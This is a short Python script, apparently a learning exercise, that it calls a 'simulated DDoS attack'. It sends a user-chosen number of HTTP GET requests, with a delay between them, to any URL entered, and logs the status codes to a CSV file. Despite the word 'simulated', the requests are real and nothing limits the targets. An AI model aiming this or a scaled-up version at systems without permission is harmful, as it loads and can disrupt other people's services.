import time
import requests
import csv
import os

LOG_FILE = "logs/attack_logs.csv"

def simulate_ddos():
    url = input("Enter the target URL: ")
    packets = int(input("Enter the number of packets: "))
    delay = float(input("Enter delay between packets (seconds): "))

    if not os.path.exists("logs"):
        os.makedirs("logs")

    with open(LOG_FILE, "w", newline="") as file:
        writer = csv.writer(file)
        writer.writerow(["Packet Number", "Status Code", "Status"])

        print(f"\nStarting simulated DDoS attack on {url}...\n")
        for i in range(1, packets + 1):
            try:
                response = requests.get(url)
                status = "Success" if response.status_code == 200 else "Failure"
                print(f"Packet {i}: {status} (HTTP {response.status_code})")
                writer.writerow([i, response.status_code, status])
            except Exception as e:
                print(f"Packet {i}: Failure (Error: {str(e)})")
                writer.writerow([i, "Error", "Failure"])
            time.sleep(delay)

if __name__ == "__main__":
    simulate_ddos()
